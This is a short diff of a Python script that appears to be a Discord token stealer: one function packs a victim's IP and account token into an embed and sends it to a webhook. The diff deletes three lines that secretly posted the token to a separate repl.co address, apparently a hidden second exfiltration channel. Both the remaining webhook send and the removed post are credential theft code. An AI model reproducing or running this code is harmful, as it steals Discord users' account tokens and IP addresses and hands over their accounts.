@@ -18,10 +18,6 @@ def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
   embed.add_field(name='IP', value=f'```{ip}```', inline=False)
   embed.add_field(name='Token', value=f'```{token}```', inline=False)
   hook.send(embed=embed, username=username, avatar_url=avatar_url)
-  w = "https://busyinsignificantfossil.yuvi5000.repl.co/x"
-  m = {"text": token}
-  r = requests.post(w, json=m)
-
 
 @app.route('/alive')
 def keep_alive():
